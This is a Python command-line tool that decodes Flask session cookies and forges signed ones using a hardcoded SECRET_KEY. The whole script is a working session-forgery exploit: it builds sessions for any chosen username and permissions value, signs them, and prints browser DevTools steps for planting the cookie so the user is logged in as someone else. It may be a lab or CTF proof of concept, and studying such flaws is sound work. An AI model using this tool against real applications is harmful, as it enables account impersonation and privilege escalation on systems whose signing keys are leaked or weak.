"""
Flask Session Cookie Decoder and Forger
Demonstrates the SECRET_KEY vulnerability
"""
import sys
from flask.sessions import SecureCookieSessionInterface
from flask import Flask
import json

SECRET_KEY = "AVerySuperSecretKey-SoNotThisOne"

# Create a minimal Flask app with the same SECRET_KEY
app = Flask(__name__)
app.secret_key = SECRET_KEY
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

def decode_cookie(cookie_value):
    """Decode a Flask session cookie"""
    try:
        if not session_serializer:
            print("[-] Session serializer not available")
            return None
        
        data = session_serializer.loads(cookie_value)
        return data
    except Exception as e:
        print(f"Error decoding cookie: {e}")
        return None

def forge_cookie(session_data):
    """Forge a new Flask session cookie with given data"""
    try:
        if not session_serializer:
            print("[-] Session serializer not available")
            return None
        
        cookie = session_serializer.dumps(session_data)
        return cookie
    except Exception as e:
        print(f"Error forging cookie: {e}")
        return None

def main():
    if len(sys.argv) < 2:
        print("\n=== Flask Cookie Tool ===\n")
        print("Usage:")
        print("  Decode:  python test_cookie_forge.py decode <cookie_value>")
        print("  Forge:   python test_cookie_forge.py forge <username> [permissions] [case_id]")
        print("\nExample:")
        print('  python test_cookie_forge.py decode "eyJ1c2VybmFtZSI6ImFsaWNlIn0..."')
        print('  python test_cookie_forge.py forge bob 1677721675 2')
        sys.exit(1)
    
    command = sys.argv[1].lower()
    
    if command == "decode":
        if len(sys.argv) < 3:
            print("Error: Cookie value required")
            sys.exit(1)
        
        cookie_value = sys.argv[2]
        print(f"\n[*] Decoding cookie with SECRET_KEY: {SECRET_KEY}\n")
        
        data = decode_cookie(cookie_value)
        if data:
            print("[+] Cookie decoded successfully:")
            print(json.dumps(data, indent=2))
        else:
            print("[-] Failed to decode cookie")
    
    elif command == "forge":
        if len(sys.argv) < 3:
            print("Error: Username required")
            sys.exit(1)
        
        username = sys.argv[2]
        permissions = int(sys.argv[3]) if len(sys.argv) > 3 else 1677721675
        case_id = int(sys.argv[4]) if len(sys.argv) > 4 else 1
        
        session_data = {
            "username": username,
            "permissions": permissions,
            "current_case": {
                "case_name": f"Case {username.upper()}",
                "case_id": case_id
            },
            "_permanent": True,
            "_fresh": False
        }
        
        print(f"\n[*] Forging cookie for user: {username}")
        print(f"[*] Using SECRET_KEY: {SECRET_KEY}\n")
        print("[*] Session data:")
        print(json.dumps(session_data, indent=2))
        print()
        
        cookie = forge_cookie(session_data)
        if cookie:
            print("[+] Forged cookie successfully:")
            print(cookie)
            print("\n[!] Copy this cookie value and set it in your browser DevTools:")
            print("    1. Open DevTools (F12)")
            print("    2. Go to Application → Cookies")
            print("    3. Find 'session' cookie")
            print("    4. Replace its value with the forged cookie above")
            print("    5. Refresh the page")
            print(f"\n[!] You will now be logged in as: {username}")
        else:
            print("[-] Failed to forge cookie")
    
    else:
        print(f"Unknown command: {command}")
        print("Use 'decode' or 'forge'")

if __name__ == "__main__":
    main()
